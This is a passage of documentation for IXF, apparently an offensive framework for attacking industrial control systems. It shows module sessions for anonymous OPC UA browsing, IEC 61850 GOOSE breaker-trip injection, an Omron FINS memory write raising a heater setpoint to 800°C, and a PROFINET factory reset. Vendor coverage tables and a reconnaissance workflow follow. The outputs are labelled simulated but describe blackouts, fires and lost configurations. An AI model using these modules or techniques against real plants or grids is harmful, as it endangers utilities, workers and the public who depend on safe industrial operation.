---

### OPC UA

**Overview:**
OPC Unified Architecture (OPC UA) is the modern successor to OPC DA, providing a platform-independent, service-oriented protocol for industrial data exchange. Despite its security architecture (X.509 certificates, TLS, user authentication), most deployments use `SecurityMode=None` (no encryption, no authentication) for convenience. IXF targets these misconfigured deployments.

**Protocol Characteristics:**
- TCP port 4840 (standard), 4843 (TLS), custom ports common
- Three security modes: None, Sign (no encryption), SignAndEncrypt (full TLS)
- Authentication: Anonymous, Username/Password, X.509 Certificate
- Services: Browse, Read, Write, Call (method execution), Subscription (monitoring)
- Namespace system: nodes identified by NamespaceIndex + NodeId
- Supports complex data structures, historical access, alarms & events, PubSub

**CVEs in IXF:**
- CVE-2023-27321: OPC UA Foundation stack buffer overflow
- CVE-2021-42565: Prosys OPC UA SDK denial of service
- CVE-2021-42543: Unified Automation server path traversal

**Module Usage — Anonymous Browse and Read:**

```
ixf > use exploits/protocols/opcua/opcua_browse_address_space
ixf [opcua_browse_address_space] > show options

  Module: exploits/protocols/opcua/opcua_browse_address_space
  Protocol: OPC UA (OPC Foundation) — TCP:4840
  MITRE: T0861 (Point and Tag Identification), T0888 (Remote System Info Discovery)

  Options:
  ──────────────────────────────────────────────────────────────────
  Name           Value        Required  Description
  ──────────────────────────────────────────────────────────────────
  target                      yes       OPC UA server IP
  port           4840         no        OPC UA port
  endpoint_url   auto         no        Override endpoint URL
  security_mode  None         no        None, Sign, SignAndEncrypt
  max_nodes      500          no        Max nodes to browse
  ──────────────────────────────────────────────────────────────────

ixf [opcua_browse_address_space] > set target 192.168.1.100
ixf [opcua_browse_address_space] > run

  [SIMULATE] OPC UA Browse — Anonymous Session
  Endpoint: opc.tcp://192.168.1.100:4840
  SecurityMode: None (no encryption)
  Authentication: Anonymous

  Would browse from Root → Objects node recursively (max 500 nodes)

  Simulated node discovery:
  ns=0;i=85    Objects
    ns=2;s=PLC  S7-1500 PLC
      ns=3;s=PID_TempControl
        ns=3;s=PID_TempControl.Setpoint      REAL  Writable (anonymous!)
        ns=3;s=PID_TempControl.ProcessValue  REAL  ReadOnly
        ns=3;s=PID_TempControl.Output        REAL  ReadOnly
      ns=3;s=PressureAlarm
        ns=3;s=PressureAlarm.Deadband        REAL  Writable (anonymous!)
        ns=3;s=PressureAlarm.HighLimit       REAL  Writable (anonymous!)
  ...
  [+] 347 nodes browsed | 23 writable nodes identified
  MITRE: T0861 (Tag identification complete)
  Next step: ttp T0836 (modify writable setpoints)
```

---

### IEC 61850

**Overview:**
IEC 61850 is the communication standard for electrical substation automation. It defines three protocols: MMS (Manufacturing Message Specification) for SCADA/engineering communication, GOOSE (Generic Object Oriented Substation Event) for peer-to-peer protection relay signaling (L2 multicast), and Sampled Values (SV) for current/voltage measurement. GOOSE is the primary attack target because it carries circuit breaker trip signals without any authentication.

**Protocol Characteristics:**
- MMS: TCP port 102 (same as S7comm — uses ISO-TSAP)
- GOOSE: L2 Ethernet multicast (EtherType 0x88B8), not routable
- SV: L2 Ethernet multicast (EtherType 0x88BA), not routable
- Logical Nodes (LN): XCBR (breaker), XSWI (switch), PTRC (trip), PDIS (distance protection)
- GOOSE carries: AppID, VLAN, stNum (state number), sqNum (sequence number), data set values
- GOOSE replay/injection: modify stNum to trigger trip, requires L2 access to substation LAN

**CVEs in IXF:**
- CVE-2019-12255: RTU500 MMS stack buffer overflow
- CVE-2020-14511: Siemens SICAM PAS MMS denial of service

**Module Usage — GOOSE Injection (L2 Attack):**

```
ixf > use exploits/protocols/iec61850/goose_injection
ixf [goose_injection] > show options

  Module: exploits/protocols/iec61850/goose_injection
  Protocol: IEC 61850 GOOSE (L2 Ethernet multicast, EtherType 0x88B8)
  MITRE: T0855 (Unauthorized Command), T0816 (Device Restart/Shutdown)
  Requirement: L2 network access to substation LAN

  Options:
  ──────────────────────────────────────────────────────────────────
  Name           Value        Required  Description
  ──────────────────────────────────────────────────────────────────
  interface      eth0         yes       Network interface for raw socket
  app_id         0x0001       yes       GOOSE AppID (from pcap/discovery)
  gocb_ref                    yes       GOOSECB reference (e.g. IED1CFG$GO$gcb01)
  dataset                     yes       Dataset reference
  inject_trip    true         no        Set Boolean1 (trip) = TRUE
  ──────────────────────────────────────────────────────────────────

ixf [goose_injection] > set interface eth0
ixf [goose_injection] > set app_id 0x0001
ixf [goose_injection] > set inject_trip true
ixf [goose_injection] > run

  [SIMULATE] IEC 61850 GOOSE Trip Injection
  Interface: eth0 | AppID: 0x0001
  Would craft and send raw GOOSE PDU with trip=TRUE, stNum=99999

  Physical impact:
  Protection relay receives trip signal → circuit breaker opens
  In a substation: substation goes dark (load shedding)
  Recovery: manual re-closing of breaker (10–30 min minimum)
  Industroyer/CRASHOVERRIDE (2016) used this exact technique
```

---

### Omron FINS

**Overview:**
FINS (Factory Interface Network Service) is Omron's proprietary protocol for communicating with CJ, CS, CP, NJ, NX, and CV series PLCs. It runs on UDP port 9600. FINS has no authentication and allows arbitrary memory read/write, PLC program upload/download, and CPU control.

**Protocol Characteristics:**
- UDP port 9600 (standard), TCP port 9600 also supported
- Commands: Memory Area Read (0x0101), Memory Area Write (0x0102), Program Upload (0x0401)
- Memory areas: DM (Data Memory), CIO, HR (Holding Relay), W (Work), T (Timer), C (Counter)
- No authentication in base protocol
- FINS Node address: 2 bytes (network + node)

**CVEs in IXF:**
- CVE-2022-34151: Omron Sysmac Studio project file RCE via FINS path traversal
- CVE-2021-27406: Omron NJ/NX controller FINS unauthenticated access

**Module Usage — Memory Area Write:**

```
ixf > use exploits/protocols/fins/fins_memory_area_write
ixf [fins_memory_area_write] > show options

  Module: exploits/protocols/fins/fins_memory_area_write
  Protocol: Omron FINS — UDP:9600
  MITRE: T0836 (Modify Parameter), T0831 (Manipulation of Control)

  Options:
  ──────────────────────────────────────────────────────────────────
  Name           Value        Required  Description
  ──────────────────────────────────────────────────────────────────
  target                      yes       Omron PLC IP address
  port           9600         no        FINS port
  dst_net        0            no        Destination FINS network
  dst_node       1            no        Destination FINS node
  memory_area    0x82         no        0x82=DM, 0xB0=CIO, 0x89=HR
  start_address  100          no        Starting word address
  data                        yes       Hex data to write (e.g. 00640001)
  ──────────────────────────────────────────────────────────────────

ixf [fins_memory_area_write] > set target 192.168.1.200
ixf [fins_memory_area_write] > set memory_area 0x82
ixf [fins_memory_area_write] > set start_address 100
ixf [fins_memory_area_write] > set data 1F40
ixf [fins_memory_area_write] > run

  [SIMULATE] Omron FINS Memory Area Write
  Target: 192.168.1.200:9600 UDP
  Area: DM (0x82), Address: D100, Data: 0x1F40 (8000 decimal)
  MITRE: T0836 (Modify Parameter)

  Physical meaning: If D100 = temperature setpoint in 0.1°C units:
  0x1F40 = 8000 = 800.0°C (vs safe operating limit of ~200°C)
  Impact: Heater runaway, thermal damage, potential fire
```

---

### PROFINET DCP

**Overview:**
PROFINET DCP (Discovery and Configuration Protocol) is used for device discovery and basic configuration on PROFINET networks. It operates at Layer 2 (no IP routing) and responds to multicast/broadcast frames, making it an excellent reconnaissance tool. IXF uses PROFINET DCP for device discovery, name assignment (which can disrupt networks), and factory reset commands.

**Protocol Characteristics:**
- L2 Ethernet, EtherType 0x8892 (PROFINET)
- DCP service types: Identify (discovery), Get, Set (configuration)
- DCP Set options: Station Name, IP address, Factory Default reset
- No authentication — any L2-accessible host can send DCP commands
- PROFINET RT (real-time) uses L2 cyclic frames for I/O data (EtherType 0x8892 with RT class)

**CVEs in IXF:**
- CVE-2017-2680: Siemens PROFINET DCP denial of service (S7-300/400/1200/1500)
- CVE-2021-37185: Siemens PROFINET stack buffer overflow

**Module Usage — DCP Scan:**

```
ixf > use scanners/ics/profinet_dcp_scan
ixf [profinet_dcp_scan] > show options

  Module: scanners/ics/profinet_dcp_scan
  Protocol: PROFINET DCP (L2) — EtherType 0x8892
  MITRE: T0846 (Remote System Discovery), T0842 (Network Topology Mapping)
  Requirement: L2 network access

  Options:
  ──────────────────────────────────────────────────────────────────
  Name           Value        Required  Description
  ──────────────────────────────────────────────────────────────────
  interface      eth0         yes       Network interface
  timeout        5            no        Response wait time (seconds)
  ──────────────────────────────────────────────────────────────────

ixf [profinet_dcp_scan] > set interface eth0
ixf [profinet_dcp_scan] > run

  [SIMULATE] PROFINET DCP Identify Request (multicast 01:0E:CF:00:00:00)

  Simulated responses:
  MAC: 00:1B:1B:A2:B3:C4  IP: 192.168.1.100  Name: plc-s7-1515  Vendor: Siemens
  MAC: 00:1B:1B:D4:E5:F6  IP: 192.168.1.101  Name: et200sp-io1   Vendor: Siemens
  MAC: 00:0A:E4:11:22:33  IP: 192.168.1.102  Name: beckhoff-cx   Vendor: Beckhoff
  MAC: 00:02:A2:44:55:66  IP: 192.168.1.103  Name: wago-750-352  Vendor: WAGO

  4 PROFINET devices discovered
  MITRE: T0846 complete (PROFINET topology mapped)
```

**Module Usage — Factory Reset (Destructive):**

```
ixf > use exploits/protocols/profinet/profinet_dcp_reset_factory
ixf [profinet_dcp_reset_factory] > set interface eth0
ixf [profinet_dcp_reset_factory] > set target_mac 00:1B:1B:A2:B3:C4
ixf [profinet_dcp_reset_factory] > run

  [SIMULATE] PROFINET DCP Factory Reset
  Target MAC: 00:1B:1B:A2:B3:C4 (unicast DCP Set — ResetToFactory)
  MITRE: T0816 (Device Restart/Shutdown)

  [!] DESTRUCTIVE: Would send DCP Set Factory Default to target
  Device would reset: IP cleared, Station Name cleared, I/O mappings lost
  Recovery: Manual reconfiguration via TIA Portal/Step 7 (~30-60 min)
  CVE-2017-2680: Siemens does not authenticate DCP Set commands
```

---

## `protocols` Command

Display the full list of supported protocols with port and module path information.

```
ixf > protocols

  IXF Supported Protocols (50)
  ════════════════════════════════════════════════════════════════════════
  Protocol                    Port          Module Path
  ──────────────────────────────────────────────────────────────────────
  Modbus TCP                  502/TCP       exploits/protocols/modbus/
  Modbus RTU                  serial        exploits/protocols/modbus/
  Siemens S7comm              102/TCP       exploits/protocols/s7comm/
  Siemens S7comm+             102/TCP+TLS   exploits/protocols/s7comm_plus/
  EtherNet/IP (CIP)           44818/TCP     exploits/protocols/enip/
  PROFINET DCP                L2 broadcast  exploits/protocols/profinet/
  PROFINET RT                 L2 multicast  exploits/protocols/profinet/
  DNP3                        20000/TCP     exploits/protocols/dnp3/
  BACnet/IP                   47808/UDP     exploits/protocols/bacnet/
  BACnet/MSTP                 serial        exploits/protocols/bacnet_mstp/
  BACnet/SC                   47808/UDP     exploits/protocols/bacnet_sc/
  IEC 60870-5-104             2404/TCP      exploits/protocols/iec104/
  IEC 60870-5-101             serial        exploits/protocols/iec101/
  IEC 61850 MMS               102/TCP       exploits/protocols/iec61850/
  IEC 61850 GOOSE             L2 multicast  exploits/protocols/iec61850/
  IEC 61850 SV                L2 multicast  exploits/protocols/iec61850/
  OPC UA                      4840/TCP      exploits/protocols/opcua/
  OPC DA (DCOM)               135/TCP       exploits/protocols/opc_da/
  OPC HDA                     135/TCP       exploits/protocols/opc_hda/
  OPC A&E                     135/TCP       exploits/protocols/opc_ae/
  Omron FINS                  9600/UDP      exploits/protocols/fins/
  Unitronics PCOM             20256/TCP     exploits/protocols/pcom/
  Beckhoff ADS/AMS            48898/TCP     exploits/protocols/ads/
  MQTT                        1883/TCP      exploits/protocols/mqtt/
  MQTT-SN                     1884/UDP      exploits/protocols/mqtt_sn/
  SNMP v1/v2c                 161/UDP       exploits/protocols/snmp/
  SNMP v3                     161/UDP       exploits/protocols/snmp/
  PROFIBUS DP                 1962/TCP (GW) exploits/protocols/profibus/
  PROFIBUS PA                 1962/TCP (GW) exploits/protocols/profibus_pa/
  HART                        5094/TCP      exploits/protocols/hart/
  WirelessHART                5094/UDP      exploits/protocols/whart/
  CANopen                     4001/TCP (GW) exploits/protocols/canopen/
  CC-Link                     61450/UDP     exploits/protocols/cc_link/
  CC-Link IE Field            61450/UDP     exploits/protocols/cc_link_ie_field/
  CC-Link IE TSN              61450/UDP     exploits/protocols/cc_link_ie_tsn/
  EtherCAT                    L2 Ethernet   exploits/protocols/ethercat/
  EtherNet/POWERLINK          L2 Ethernet   exploits/protocols/powerlink/
  SERCOS III                  8008/TCP      exploits/protocols/sercos/
  IO-Link                     point-to-pt   exploits/protocols/iolink/
  INTERBUS                    1962/TCP (GW) exploits/protocols/interbus/
  ControlNet                  44818/TCP     exploits/protocols/controlnet/
  DeviceNet                   44818/TCP (GW) exploits/protocols/devicenet/
  PCCC (Allen-Bradley)        44818/TCP     exploits/protocols/pccc/
  FL-NET (OPCN-2)             7000/UDP      exploits/protocols/fl_net/
  CompoNet                    9600/TCP (GW) exploits/protocols/componet/
  Yokogawa Vnet/IP            20111/TCP     exploits/protocols/vnetip/
  FOUNDATION Fieldbus H1      1089/TCP      exploits/protocols/foundation_fieldbus/
  FOUNDATION Fieldbus HSE     1089/TCP      exploits/protocols/foundation_fieldbus/
  LonWorks/LonTalk            1628/UDP      exploits/protocols/lonworks/
  KNX/EIB                     3671/UDP      exploits/protocols/knx/
  CIP Safety                  44818/TCP     exploits/protocols/ethernet_ip_cip_safety/
  PROFIsafe                   PROFINET      exploits/protocols/profisafe/
  FSoE (TwinSAFE)             L2 EtherCAT   exploits/protocols/fsoe/
  SECS/GEM (HSMS)             5000/TCP      exploits/protocols/hsms/
  Serial-to-Ethernet          4001/TCP      exploits/protocols/serial/
  ──────────────────────────────────────────────────────────────────────
  Total: 50+ protocols | Use `search <protocol>` to find modules

ixf > protocols --filter bacnet

  Matching protocols (3):
  BACnet/IP      47808/UDP  exploits/protocols/bacnet/
  BACnet/MSTP    serial     exploits/protocols/bacnet_mstp/
  BACnet/SC      47808/UDP  exploits/protocols/bacnet_sc/
```

---

## `vendors` Command

Display all 150+ covered vendors with CVE module counts, optionally filtered by name or region.

```
ixf > vendors

  IXF Vendor Coverage (150 vendors)
  ════════════════════════════════════════════════════════════════════════
  Vendor                       Region      CVE Modules  Cred Modules
  ──────────────────────────────────────────────────────────────────────
  schneider_electric           France          39           8
  rockwell_automation          USA             38           7
  siemens                      Germany         27           6
  honeywell                    USA             20           5
  ge / ge_vernova              USA             18           4
  abb                          Switzerland     22           5
  aveva / osisoft              USA             14           3
  emerson                      USA             16           4
  advantech                    Taiwan          15           3
  delta_electronics            Taiwan          11           3
  omron                        Japan           12           4
  inductive_automation         USA              5           2
  tridium_niagara              USA              5           2
  delta_controls               Canada           1           1
  saia_burgess                 Switzerland      1           1
  ... [140+ more vendors]

  Use: vendors <region|country|name_filter> to filter results

ixf > vendors japan

  Vendors — Japan (7 vendors)
  ════════════════════════════════════════════════════════════════════════
  Vendor              Key Products                    CVE Modules
  ──────────────────────────────────────────────────────────────────────
  Yokogawa            CENTUM VP, FAST/TOOLS, STARDOM        5
  Omron               NX/NJ, CJ2M, CP2E, Vision             12
  Mitsubishi Electric MELSEC iQ-R/Q, GOT2000 HMI            3
  FANUC               CNC 30i, Robot Controller Ri           2
  Yaskawa             Sigma-7, MP3300 motion                 2
  Keyence             KV Series PLCs                         2
  Panasonic           FP7 PLCs, GT2000 HMI                   1
  ──────────────────────────────────────────────────────────────────────
  Total: 7 vendors | 27 CVE modules

ixf > vendors brazil

  Vendors — Brazil (6 vendors)
  ════════════════════════════════════════════════════════════════════════
  Vendor              Key Products                    CVE Modules  Cred  Scanner
  ──────────────────────────────────────────────────────────────────────────────
  WEG                 CFW-11/21 VFD, Motor Scan IIoT      2        1      yes
  ALTUS               Duo PLC, Nexto Xpress              1        1      yes
  Novus               N20K48, DigiRail controllers        1        1      no
  Elipse Software     E3 SCADA, Elipse SCADA             2        1      yes
  Smar                ProcessView, CONF-IM SCADA         1        1      no
  Digicon             RTU data concentrators              1        0      yes
```

---

## Vendor Coverage by Region

### Europe

| Vendor | Country | Key Products | CVE Modules | Cred Modules | Has Scanner | Has Default Creds |
|--------|---------|--------------|-------------|--------------|-------------|-------------------|
| Siemens | Germany | S7-1200/1500/300/400, WinCC, PCS 7, SCALANCE X, TIA Portal, SINEMA, Desigo CC | 27 | 6 | yes | yes |
| Schneider Electric | France | Modicon M340/M580/Premium/Quantum, EcoStruxure Plant, EcoStruxure Machine, APC | 39 | 8 | yes | yes |
| ABB | Switzerland | System 800xA, AC500/AC500eco, Relion 670/650 relays, RTU500, Automation Builder | 22 | 5 | yes | yes |
| Beckhoff | Germany | TwinCAT 3, EtherCAT, CX-series embedded PCs, ADS/AMS | 5 | 2 | yes | yes |
| Phoenix Contact | Germany | PLCnext Technology, AXC F series, WebVisit HMI, mGuard Security Router | 6 | 2 | yes | yes |
| WAGO | Germany | PFC100/PFC200, 750-series I/O, e!COCKPIT, Cloud Connectivity | 2 | 1 | yes | yes |
| Pilz | Germany | PNOZmulti, PSS4000 Safety PLC, PNOZsigma | 1 | 0 | no | no |
| B&R Automation | Austria | APROL DCS, X20/X67 I/O, Acopos servo, ctrlX (BOSCH Rexroth JV) | 2 | 1 | no | yes |
| Festo | Germany | CPX-AP-I controller, AX servo drive, CMMT | 1 | 0 | no | no |
| Endress+Hauser | Switzerland | Fieldgate FXA30, VEGAPULS radar, FieldCare DTM | 2 | 1 | no | no |
| Pepperl+Fuchs | Germany | ICE2/ICE3 IO-Link Masters, HART multiplexer | 1 | 0 | no | no |
| SICK AG | Germany | S3000/S30A safety scanners, RUGGEDCOM interface | 2 | 0 | no | no |
| HMS Networks | Sweden | Anybus X-Gateway, eWON Flexy 205, Flexy 57x, Talk2M | 2 | 1 | yes | yes |
| Belden/Hirschmann | Germany | Eagle One industrial firewall, RSPE/RS20 switches, Gecko OS | 2 | 1 | yes | yes |
| Westermo | Sweden | Lynx L110/L205 industrial switches, Viper SC+ | 1 | 1 | yes | yes |
| Ruggedcom (Siemens) | Germany | ROS/ROX II IED routers, WIN7200 industrial router | 2 | 1 | yes | yes |
| Metso/Valmet | Finland | DNA DCS, Neles ND9000 valve controller | 1 | 1 | no | yes |
| Danfoss | Denmark | VLT/VACON 100 drives, Optyma industrial drives | 1 | 1 | no | yes |
| Krohne | Germany | SUMMIT 8800 flow computer, OPTIWAVE radar | 2 | 1 | no | yes |
| Lenze | Germany | i550 series drives, L-force Engineer | 1 | 0 | no | yes |
| Hilscher | Germany | netX 90/51 fieldbus chips, cifX PC cards | 1 | 0 | no | no |
| Softing | Germany | DataFEED OPC Suite, OT Security Box | 2 | 0 | no | no |
| Saia-Burgess (Honeywell) | Switzerland | PCD1/PCD3 Series PLC, WebEditor | 1 | 1 | yes | yes |
| Sauter AG | Switzerland | moduWeb Vision BAS, CASE Suite | 1 | 1 | yes | yes |
| Distech Controls | France | ECLYPSE ECY-S30 BACnet controller, Allure touchscreen | 1 | 1 | yes | yes |
| Sofrel | France | LS-4x water RTU, S4W SCADA | 1 | 0 | no | yes |
| Ewon/HMS | Belgium | eWON Flexy VPN gateway, EC350 IoT gateway | 1 | 1 | yes | yes |
| Kuka | Germany | KR C4/C5 robot controller, KUKA.WorkVisual | 1 | 0 | no | yes |

### Americas

| Vendor | Country | Key Products | CVE Modules | Cred Modules | Has Scanner | Has Default Creds |
|--------|---------|--------------|-------------|--------------|-------------|-------------------|
| Rockwell Automation | USA | ControlLogix 1756, CompactLogix 5370/5380, FactoryTalk, Studio 5000, Kinetix | 38 | 7 | yes | yes |
| Honeywell | USA | Experion PKS, C300 Controller, Spyder BAS, Enraf Tank Gauge, Maxpro VMS | 20 | 5 | yes | yes |
| Emerson | USA | DeltaV DCS, ROC800/800L, FloBoss S600, Fisher FIELDVUE, Ovation | 16 | 4 | yes | yes |
| GE / GE Vernova | USA | CIMPLICITY 11.0, iFIX 6.5, PACSystems RX3i/RSTi, MiCOM P443 relay, Grid Solutions | 18 | 4 | yes | yes |
| Inductive Automation | USA | Ignition SCADA 8.x, Perspective, Vision | 5 | 2 | yes | yes |
| Tridium / Johnson Controls | USA | Niagara 4 Framework, JACE 8000, AX controller | 5 | 2 | yes | yes |
| AVEVA / OSIsoft | USA | System Platform 2020R2, InTouch HMI, PI Historian, Wonder Ware | 14 | 3 | yes | yes |
| AspenTech | USA | Aspen InfoPlus.21, aspenONE MES | 1 | 1 | no | yes |
| AutomationDirect | USA | CLICK PLCs, DirectLogix, EZ-TOUCH HMI | 1 | 1 | yes | yes |
| Red Lion Controls | USA | Crimson 3.x, RAM industrial router, FlexEdge DA50A | 1 | 1 | yes | yes |
| Opto 22 | USA | groov EPIC, groov RIO, SNAP PAC | 1 | 0 | no | yes |
| ProSoft Technology | USA | RadioLinx 802.11n, ICX35 cellular gateway | 2 | 1 | yes | yes |
| Bedrock Automation | USA | Open Secure PLC, BSX module | 1 | 0 | no | no |
| Moore Industries | USA | SPC signal processor, TCS thermocouple | 1 | 0 | no | yes |
| Sensata / Dimensions | USA | Beacon RTU, 4/20mA transmitters | 1 | 0 | no | yes |
| S&C Electric | USA | PureWave/GeoScale power switching, GridMaster SCADA | 1 | 0 | no | no |
| Compressor Controls (CCC) | USA | TurboControl MkV gas turbine SCADA | 1 | 1 | no | yes |
| Flowserve | USA | PumpWorks industrial pump controllers | 1 | 0 | no | yes |
| Weatherford | USA | CygNet SCADA, WellPilot | 1 | 0 | no | yes |
| Sierra Wireless | Canada | AirLink LX40/MG90 industrial routers | 1 | 1 | yes | yes |
| Delta Controls | Canada | ORCAview BAS controller, enteliTOUCH | 1 | 1 | yes | yes |
| Automated Logic (Carrier) | USA | WebCTRL BAS, e-Node, ALC-MSTP | 1 | 1 | yes | yes |
| KMC Controls | USA | Commander BACnet/IP, Conquest DDC | 1 | 1 | no | yes |
| Grundfos | Denmark/USA | CUE 3 VFD, IO102 signal relay | 2 | 1 | no | yes |
| Westinghouse / Curtiss-Wright | USA | Common Q Nuclear I&C, Ovation Nuclear | 1 | 0 | no | no |
| Itron | USA | Riva C smart meter, SL7000 data collector | 1 | 0 | no | yes |
| Landis+Gyr | USA/Switzerland | E360 smart meter, Gridstream RF MDMS | 1 | 0 | no | yes |

### Brazil / LATAM Special Section

Brazil and Latin America have a growing ICS/OT footprint driven by the oil & gas (Petrobras, pre-salt), power grid (ANEEL-regulated utilities), water treatment (SABESP, CEDAE), and manufacturing sectors. IXF includes specific coverage for Brazilian/LATAM vendors.

| Vendor | Country | Key Products | CVE Modules | Cred Modules | Has Scanner | Notes |
|--------|---------|--------------|-------------|--------------|-------------|-------|
| WEG S.A. | Brazil | CFW-11/CFW-21 VFD, Motor Scan IIoT gateway, W-series motors | 2 | 1 | yes | Jaraguá do Sul, SC. CFW-11 web interface default creds. |
| ALTUS Sistemas | Brazil | Duo PLC series (DUO350/500), Nexto Xpress, AL5000 HMI | 1 | 1 | yes | Porto Alegre, RS. Nexto web API unauthenticated access. |
| Novus Produtos Eletrônicos | Brazil | N20K48, DigiRail-2A RTD controller, FlexPAC | 1 | 1 | no | Porto Alegre, RS. Default credentials on web interface. |
| Elipse Software | Brazil | Elipse E3 SCADA, Elipse SCADA, Elipse Power, epics automation | 2 | 1 | yes | Porto Alegre, RS. E3 Server path traversal + auth bypass. |
| Smar Equipamentos Industriais | Brazil | ProcessView SCADA, LD302 FOUNDATION Fieldbus transmitter, CONF-IM | 1 | 1 | no | Sertãozinho, SP. ProcessView web server auth bypass. |
| Digicon | Brazil | RTU data concentrators, telemetry systems for water utilities | 1 | 0 | yes | Porto Alegre, RS. Used by CORSAN and other water utilities. |

**LATAM context notes:**
- Modbus is the dominant protocol in Brazil's power sector (ANEEL systems, distribution substations)
- DNP3 is widely used in CEMIG, COPEL, Eletrobras substations
- IEC 104 is growing, particularly in new substation automation projects post-2015
- SCADA systems in Brazil's water sector (SABESP, Sanepar) predominantly use Elipse E3 or Inductive Automation Ignition
- WEG VFDs are extremely common in Brazilian industrial plants (food & beverage, pulp & paper, mining)
- Petrobras pre-salt uses Emerson DeltaV and Yokogawa CENTUM VP for offshore platform control

---

### Asia-Pacific

| Vendor | Country | Key Products | CVE Modules | Cred Modules | Has Scanner | Has Default Creds |
|--------|---------|--------------|-------------|--------------|-------------|-------------------|
| Yokogawa Electric | Japan | CENTUM VP, FAST/TOOLS SCADA, STARDOM FCN/FCJ, Vigilant Plant | 5 | 2 | yes | yes |
| Omron | Japan | NX102/NX1P Sysmac, CJ2M/CP1E/CP2E, Vision Series HMI, FH image proc | 12 | 4 | yes | yes |
| Mitsubishi Electric | Japan | MELSEC iQ-R/iQ-F/Q/L, GENESIS64 HMI, MELSOFT GX Works3, GOT2000 | 3 | 2 | yes | yes |
| FANUC | Japan | FANUC CNC Series 30i/31i, Robot Controller R-30iB, FIELD system | 2 | 1 | no | yes |
| Yaskawa Electric | Japan | Sigma-7 servo drives, MP3300 IEC controller, YRC1000 robot | 2 | 1 | no | yes |
| Keyence | Japan | KV-8000 series PLCs, VT5-series HMI, SR-X barcode | 2 | 1 | yes | yes |
| Panasonic Industry | Japan | FP7/FP-X/FP0R PLCs, GT2000 HMI, MINAS A6 servo | 1 | 1 | no | yes |
| Fuji Electric | Japan | MICREX-SX, V9/V10 Monitouch HMI, FRENIC-Mega VFD | 2 | 1 | no | yes |
| JTEKT | Japan | TOYOPUC PC10G/PC3J PLCs, CNC C70 | 2 | 1 | no | yes |
| HIWIN | Taiwan | MC Series motion controllers, MHSV servo drive | 1 | 0 | no | yes |
| Weintek | Taiwan | cMT3158X HMI, EasyBuilder Pro, EasyAccess 2.0 | 2 | 1 | yes | yes |
| Delta Electronics | Taiwan | DIAEnergie, AS-series PLCs, DVP PLC, Delta Industrial Automation | 11 | 3 | yes | yes |
| Fatek Automation | Taiwan | FBS Series PLCs, FEN02 Ethernet card | 2 | 1 | yes | yes |
| Vigor | Taiwan | VH Series PLCs, VB5 HMI | 1 | 1 | no | yes |
| LS Electric (formerly LS IS) | South Korea | XGK/XGI Series PLCs, CIMON SCADA, LS Drive IG5A | 1 | 1 | yes | yes |
| Hollysys | China | MACS-S DCS, HolliField NCS, LE5000 controller | 2 | 1 | no | yes |
| Supcon | China | JX-300XP/300X DCS, InPlant historian | 1 | 1 | no | yes |
| Inovance | China | AM600 PLC, H5U controller, MD500 VFD | 1 | 1 | no | yes |
| INVT | China | Goodrive 300 VFD, IVC series PLC | 1 | 0 | no | yes |
| CHINT | China | NTCP smart circuit breaker, NVF2G VFD | 1 | 0 | no | yes |
| Kinco | China | K5/K6 Series PLCs, GL070H HMI | 1 | 1 | yes | yes |
| Delixi | China | CDN PLC series, CE6 servo drive | 1 | 0 | no | yes |
| STEP Electric | China | AC301E/AS320 VFD | 1 | 0 | no | yes |
| AutoStaff | China | AS300 series DCS | 1 | 0 | no | yes |

---

### Energy / Power Grid Specialists

| Vendor | Country | Key Products | CVE Modules | Notes |
|--------|---------|--------------|-------------|-------|
| Schweitzer Engineering Labs (SEL) | USA | SEL-421 protection relay, SEL-5037/5056 SCADA, SEL-3620 SCADA gateway | 2 | Industry security leader; SEL Architect used for substation cybersecurity |
| Alstom / GE Power (Grid Solutions) | France/USA | P40 Agile relay, MiCOM P443, T60 transformer protection | 2 | Post-GE acquisition; Multilin brand used in Americas |
| Hitachi Energy (former ABB Grid) | Switzerland | RTU500 series, Relion 670/615 relays, MicroSCADA, FOXMAN | 3 | Divested from ABB to Hitachi in 2020 |
| GE Multilin | USA | 850F feeder protection, 369 motor protection | 2 | Americas-dominant protection relay brand |
| Landis+Gyr | Switzerland/USA | E360/E570 smart meters, Gridstream RF network | 1 | AMI/smart metering focus |
| Itron | USA | Riva C/D smart meters, SL7000 data collector, OpenWay Riva | 1 | Americas/EMEA smart metering |
| Elster (Honeywell) | Germany/USA | A3 ALPHA smart meter, Enmet MV metering | 1 | Post-Honeywell acquisition |
| Kongsberg | Norway | K-Pos dynamic positioning, Maritime Vessel Management | 1 | Maritime/offshore OT |
| Doble Engineering | USA | M4100 relay test, PQ-1 power quality | 0 | Testing equipment; occasionally network-connected |

---

### Specialized / Other

| Vendor | Category | Key Products | CVE Modules |
|--------|---------|--------------|-------------|
| PTC / ThingWorx | IIoT Platform | ThingWorx 9.x, Kepware KepServerEX, Vuforia | 3 |
| Cisco Systems | Industrial Networking | IR800/829 industrial routers, IE3400/IE4000 switches, CG-OS | 2 |
| Teltonika Networks | Cellular Routers | RUT955/RUT956 industrial 4G routers, RUTX11 5G | 1 |
| Moxa Technologies | Serial/Networking | NPort 5000 serial servers, EDS managed switches, UC-8100 | 3 |
| Framatome | Nuclear I&C | TELEPERM XP, TELEPERM ME, SPINLINE 3 reactor protection | 1 |
| Wabtec (GE Transport) | Railway SCADA | MASTER SCADA, ETC control | 1 |
| Thales | Critical SCADA | Critical infrastructure SCADA, Metro SCADA | 0 |
| OSIsoft (AVEVA) | Historian | PI System, PI Server 2018/2023, AF SDK | 3 |
| Kepware (PTC) | OPC DA/UA Server | KepServerEX 6.x, Connectivity Suite | 2 |
| Matrikon (Honeywell) | OPC | OPC Server for Modbus, OPC Tunneller | 1 |

---

## Vendor Discovery Workflow

When you encounter an unknown device on an OT network, use the following workflow to identify the vendor and find applicable IXF modules.

### Step 1: Protocol Fingerprinting

```
# Use the generic ICS scanner first
ixf > use scanners/ics/ics_network_mapper
ixf [ics_network_mapper] > set target 192.168.1.0/24
ixf [ics_network_mapper] > run

  [*] Probing 192.168.1.0/24 for ICS services...
  [+] 192.168.1.50  — port 502/TCP   (Modbus TCP)
  [+] 192.168.1.100 — port 102/TCP   (S7comm / IEC MMS)
  [+] 192.168.1.110 — port 47808/UDP (BACnet/IP)
  [+] 192.168.1.200 — port 9600/UDP  (Omron FINS)
  [+] 192.168.1.250 — port 44818/TCP (EtherNet/IP)
```

### Step 2: Vendor/Model Identification

```
# For the unknown device at 192.168.1.50 (Modbus TCP)
ixf > use exploits/protocols/modbus/modbus_device_id
ixf [modbus_device_id] > set target 192.168.1.50
ixf [modbus_device_id] > run

  [*] Modbus TCP Device ID (FC43, MEI Type 14)
  [+] VendorName:       Schneider Electric
